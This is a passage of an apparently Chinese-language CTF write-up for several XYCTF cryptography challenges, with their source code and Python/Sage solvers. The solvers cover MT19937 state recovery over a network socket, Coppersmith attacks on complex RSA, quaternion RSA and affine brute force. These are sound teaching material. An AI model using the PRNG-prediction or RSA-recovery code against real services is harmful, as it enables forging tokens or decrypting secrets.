class="keyword">else</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;nominator&#125;</span>//<span class="subst">&#123;denominator&#125;</span> = <span class="subst">&#123;nominator//denominator&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="keyword">elif</span> choose == <span class="string">&#x27;2&#x27;</span>:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            ans = <span class="built_in">input</span>(<span class="string">&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>)  </span><br><span class="line">            rand1 = random.getrandbits(<span class="number">11000</span>)  </span><br><span class="line">            rand2 = random.getrandbits(<span class="number">10000</span>)  </span><br><span class="line">            correct_ans = rand1 // rand2  </span><br><span class="line">            <span class="keyword">if</span> correct_ans == <span class="built_in">int</span>(ans):  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;WOW&#x27;</span>)  </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Here is your flag: <span class="subst">&#123;f.read()&#125;</span>&#x27;</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;NOPE, the correct answer is <span class="subst">&#123;correct_ans&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid choice&#x27;</span>)</span><br></pre></td></tr></table></figure><p>MT19937随机数状态预测，分母全部传个1就可以直接得到生成的随机数，由此获取624个状态再预测就可以了：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange  </span><br><span class="line">  </span><br><span class="line">p = remote(<span class="string">&quot;ip&quot;</span>, port)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_state</span>():  </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;= &#x27;</span>)  </span><br><span class="line">    st = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(st)  </span><br><span class="line">  </span><br><span class="line">rc = RandCrack()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">624</span>):  </span><br><span class="line">    state = get_state()  </span><br><span class="line">    rc.submit(state)  </span><br><span class="line">  </span><br><span class="line">rand1 = rc.predict_getrandbits(<span class="number">11000</span>)  </span><br><span class="line">rand2 = rc.predict_getrandbits(<span class="number">10000</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(rand1 // rand2).encode())  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20  </span><br><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):  </span><br><span class="line">        self.re = re  </span><br><span class="line">        self.im = im  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):  </span><br><span class="line">        re_ = self.re * c.re - self.im * c.im  </span><br><span class="line">        im_ = self.re * c.im + self.im * c.re  </span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):  </span><br><span class="line">        <span class="keyword">return</span> self.re == c.re <span class="keyword">and</span> self.im == c.im  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):  </span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &gt;&gt; m, self.im &gt;&gt; m)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):  </span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &lt;&lt; m, self.im &lt;&lt; m)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:  </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)  </span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:  </span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span>  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">return</span> [self.re, self.im]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):  </span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)  </span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:  </span><br><span class="line">            result = result * c  </span><br><span class="line">            result.re = result.re % n  </span><br><span class="line">            result.im = result.im % n  </span><br><span class="line">        c = c * c  </span><br><span class="line">        c.re = c.re % n  </span><br><span class="line">        c.im = c.im % n  </span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line">  </span><br><span class="line">bits = <span class="number">128</span>  </span><br><span class="line">p = getPrime(<span class="number">1024</span>)  </span><br><span class="line">q = getPrime(<span class="number">1024</span>)  </span><br><span class="line">n = p * q  </span><br><span class="line">m = Complex(getRandomRange(<span class="number">1</span>, n), getRandomRange(<span class="number">1</span>, n))  </span><br><span class="line">e = <span class="number">3</span>  </span><br><span class="line">c = complex_pow(m, e, n)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mh = <span class="subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c.tolist()&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">n = ...  </span></span><br><span class="line"><span class="string">mh = [..., ...]  </span></span><br><span class="line"><span class="string">C = [..., ...]  </span></span><br><span class="line"><span class="string">enc = ... </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>复数RSA，而且泄露了明文高位，对于明文$m$，可知：</p><script type="math/tex; mode=display">C=m^3=[Re(m)+i\cdot Im(m)]^3=[Re(m)^3 - 3Re(m)Im(m)^2] + i[3Re(m)^2Im(m) - Im(m)^3]</script><p>在这里已知$Re(m)$以及$Im(m)$的高1920位，所以我们可以通过二元coppersmith来还原低位，在这里仅使用密文的实部（实际上用虚部也是可以的），可以构造得到多项式：</p><script type="math/tex; mode=display">f=(mh_0+x)^3-3(mh_0+x)(mh_1+y)^2-Re(C)</script><p>上式中$mh_0,mh_1$对应题目给出数据中的<code>mh[0],mh[1]</code>，通过下述代码就可以得到flag了：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficients_monomials()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = ...</span><br><span class="line">mh = [..., ...]</span><br><span class="line">C = [..., ...]</span><br><span class="line">enc = ...</span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">R.&lt;x, y&gt; = Zmod(n)[]</span><br><span class="line"></span><br><span class="line">re_m = mh[<span class="number">0</span>] + x</span><br><span class="line">im_m = mh[<span class="number">1</span>] + y</span><br><span class="line"></span><br><span class="line">f = re_m^<span class="number">3</span> - <span class="number">3</span>*re_m*im_m^<span class="number">2</span> - C[<span class="number">0</span>]</span><br><span class="line">a, b = small_roots(f, bounds=(<span class="number">2</span>^bits, <span class="number">2</span>^bits), m=<span class="number">1</span>, d=<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(mh[<span class="number">0</span>] + mh[<span class="number">1</span>] + ZZ(a) + ZZ(b)).encode()).digest()</span><br><span class="line"></span><br><span class="line">cipher = ChaCha20.new(key=key, nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plaintext = cipher.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(plaintext.decode())</span><br></pre></td></tr></table></figure></p><h3 id="复复复复数"><a href="#复复复复数" class="headerlink" title="复复复复数"></a>复复复复数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):  </span><br><span class="line">        self.value = value  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):  </span><br><span class="line">        s = <span class="built_in">str</span>(self.value[<span class="number">0</span>])  </span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.value[<span class="number">1</span>:]):  </span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:  </span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span>  </span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]  </span><br><span class="line">        <span class="keyword">return</span> s  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):  </span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(self.value,x.value)])  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):  </span><br><span class="line">        a = self.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]  </span><br><span class="line">        b = self.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]  </span><br><span class="line">        c = self.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]  </span><br><span class="line">        d = self.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]  </span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):  </span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> self.value])  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):  </span><br><span class="line">        tmp = ComComplex(self.value)  </span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])  </span><br><span class="line">        <span class="keyword">while</span> x:  </span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:  </span><br><span class="line">                a *= tmp  </span><br><span class="line">            tmp *= tmp  </span><br><span class="line">            <span class="keyword">if</span> n:  </span><br><span class="line">                a %= n  </span><br><span class="line">                tmp %= n  </span><br><span class="line">            x &gt;&gt;= <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">return</span> a  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint  </span><br><span class="line">  </span><br><span class="line">p = getPrime(<span class="number">256</span>)  </span><br><span class="line">q = getPrime(<span class="number">256</span>)  </span><br><span class="line">r = getPrime(<span class="number">256</span>)  </span><br><span class="line">n = p * q * r  </span><br><span class="line">  </span><br><span class="line">P = getPrime(<span class="number">512</span>)  </span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(hint) == <span class="number">20</span>  </span><br><span class="line">hints = ComComplex([bytes_to_long(hint[i:i+<span class="number">5</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>,<span class="number">5</span>)])  </span><br><span class="line">keys = ComComplex([<span class="number">0</span>, p, q, r])  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint =&#x27;</span>,hints)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift =&#x27;</span>,hints*keys%P)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;P =&#x27;</span>,P)  </span><br><span class="line">  </span><br><span class="line">e = <span class="number">65547</span>  </span><br><span class="line">m = ComComplex([bytes_to_long(flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>)])  </span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)  </span><br></pre></td></tr></table></figure><p>这个显然是一个四元数的RSA问题，那么我们首先需要分解出$n$，设hint为$h$，keys为$k$，gifts为$g$，则在模$P$的四元数下有：</p><script type="math/tex; mode=display">g=hk</script><p>我们知道，四元数$a+bi+cj+dk$可以通过一个方阵等价表示：</p><script type="math/tex; mode=display">a+bi+cj+dk\leftrightarrow\left(\begin{matrix}a&b&c&d\\-b&a&-d&c\\-c&d&a&-b\\-d&-c&b&a\end{matrix}\right)</script><p>而四元数的乘法也可以等价地转换为矩阵的乘法，设$h$对应矩阵$H$，$k$对应矩阵$K$，$h$对应矩阵$G$，则上述计算可以等价于$G=HK$，这样的话我们就可以通过矩阵求逆得到$K$，从而得到$p,q,r$了（之后的操作都会将四元数处理为数组）：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">h = [<span class="number">375413371936</span>, <span class="number">452903063925</span>, <span class="number">418564633198</span>, <span class="number">452841062207</span>]</span><br><span class="line">g = [<span class="number">8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729</span>, <span class="number">20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171</span>, <span class="number">22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868</span>, <span class="number">40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863</span>]</span><br><span class="line">P = <span class="number">8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line">n = <span class="number">408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line"></span><br><span class="line">H = matrix(Zmod(P),</span><br><span class="line">[[h[<span class="number">0</span>], h[<span class="number">1</span>], h[<span class="number">2</span>], h[<span class="number">3</span>]],</span><br><span class="line">[-h[<span class="number">1</span>], h[<span class="number">0</span>], -h[<span class="number">3</span>], h[<span class="number">2</span>]],</span><br><span class="line">[-h[<span class="number">2</span>], h[<span class="number">3</span>], h[<span class="number">0</span>], -h[<span class="number">1</span>]],</span><br><span class="line">[-h[<span class="number">3</span>], -h[<span class="number">2</span>], h[<span class="number">1</span>], h[<span class="number">0</span>]]])</span><br><span class="line"></span><br><span class="line">G = matrix(Zmod(P),</span><br><span class="line">[[g[<span class="number">0</span>], g[<span class="number">1</span>], g[<span class="number">2</span>], g[<span class="number">3</span>]],</span><br><span class="line">[-g[<span class="number">1</span>], g[<span class="number">0</span>], -g[<span class="number">3</span>], g[<span class="number">2</span>]],</span><br><span class="line">[-g[<span class="number">2</span>], g[<span class="number">3</span>], g[<span class="number">0</span>], -g[<span class="number">1</span>]],</span><br><span class="line">[-g[<span class="number">3</span>], -g[<span class="number">2</span>], g[<span class="number">1</span>], g[<span class="number">0</span>]]])</span><br><span class="line"></span><br><span class="line">K = H^-<span class="number">1</span> * G</span><br><span class="line">_, p, q, r = K[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> ZZ(p) * ZZ(q) * ZZ(r) == n</span><br><span class="line"></span><br><span class="line">p, q, r = ZZ(p), ZZ(q), ZZ(r)</span><br></pre></td></tr></table></figure><br>在此之后就要求解四元数RSA了，已知四元数可以用一个四阶方阵来表示，那么我们从<a href="https://mathoverflow.net/questions/109483/maximal-order-of-elements-in-gln-p">gr.group theory - maximal order of elements in GL(n,p) - MathOverflow</a>中很容易知道在模$n=pqr$下的最大阶应为$\varphi=(p^4-1)(q^4-1)(r^4-1)$，但是在这里$(65547, \varphi)=9$，而且通过测试可以知道：</p><script type="math/tex; mode=display">(65547, p^4-1)=(65547, q^4-1)=(65547, r^4-1)=3</script><p>我们猜测flag分块之后不可能大于$p,q,r$中任意一个，那么我们可以考虑尝试将该线性群的阶缩减为$\varphi/27$，此时通过普通的矩阵RSA就可以求得flag：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103</span>, <span class="number">24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825</span>, <span class="number">45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125</span>, <span class="number">96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385</span>]</span><br><span class="line"></span><br><span class="line">C = matrix(Zmod(n),</span><br><span class="line">[[c[<span class="number">0</span>], c[<span class="number">1</span>], c[<span class="number">2</span>], c[<span class="number">3</span>]],</span><br><span class="line">[-c[<span class="number">1</span>], c[<span class="number">0</span>], -c[<span class="number">3</span>], c[<span class="number">2</span>]],</span><br><span class="line">[-c[<span class="number">2</span>], c[<span class="number">3</span>], c[<span class="number">0</span>], -c[<span class="number">1</span>]],</span><br><span class="line">[-c[<span class="number">3</span>], -c[<span class="number">2</span>], c[<span class="number">1</span>], c[<span class="number">0</span>]]])</span><br><span class="line"></span><br><span class="line">e = <span class="number">65547</span></span><br><span class="line">phi = (p**<span class="number">4</span> - <span class="number">1</span>)*(q**<span class="number">4</span> - <span class="number">1</span>)*(r**<span class="number">4</span> - <span class="number">1</span>)//<span class="number">27</span></span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">M = C^d</span><br><span class="line"></span><br><span class="line">res = M[<span class="number">0</span>]</span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">    flag += long_to_bytes(ZZ(x))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p><h3 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h3><blockquote><p>据说我的解法是非预期</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)  </span><br><span class="line">flag = flag.rstrip(<span class="string">&#x27;&#125;&#x27;</span>).lstrip(<span class="string">&#x27;XYCTF&#123;&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">table = string.ascii_letters + string.digits  </span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> table <span class="keyword">for</span> i <span class="keyword">in</span> flag)  </span><br><span class="line">r = random.Random()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):  </span><br><span class="line">        self.a = <span class="number">1145140</span>  </span><br><span class="line">        self.b = <span class="number">19198100</span>  </span><br><span class="line">        random.seed(seed)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):  </span><br><span class="line">        x = random.randint(self.a, self.b)  </span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">return</span> x  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self, k</span>):  </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):  </span><br><span class="line">            x = self.<span class="built_in">next</span>()  </span><br><span class="line">        <span class="keyword">return</span> x  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, a, b</span>):  </span><br><span class="line">    c = [(a * table.index(m) + b) % <span class="number">19198111</span> <span class="keyword">for</span> m <span class="keyword">in</span> msg]  </span><br><span class="line">    <span class="keyword">return</span> c  </span><br><span class="line">  </span><br><span class="line">seed = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me seed: &#x27;</span>))  </span><br><span class="line">prng = PRNG(seed)  </span><br><span class="line">a = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))  </span><br><span class="line">b = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))  </span><br><span class="line">enc = encrypt(flag, a, b)  </span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><p>有个仿射，而且我们知道字母表下标的范围，直接爆破参数$a$以及第一个字母就可以了（下面是种子为1的数据）：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">table = string.ascii_letters + string.digits  </span><br><span class="line">  </span><br><span class="line">enc = [<span class="number">10021509</span>, <span class="number">10021509</span>, <span class="number">13396490</span>, <span class="number">1722743</span>, <span class="number">10021509</span>, <span class="number">13396490</span>, <span class="number">13616146</span>, <span class="number">16991127</span>, <span class="number">14667921</span>, <span class="number">6091782</span>, <span class="number">17765529</span>, <span class="number">12067342</span>, <span class="number">4542978</span>, <span class="number">16991127</span>, <span class="number">16216725</span>, <span class="number">3768576</span>, <span class="number">16991127</span>, <span class="number">15442323</span>, <span class="number">15442323</span>, <span class="number">4542978</span>, <span class="number">17765529</span>, <span class="number">14390548</span>, <span class="number">16216725</span>, <span class="number">1942399</span>, 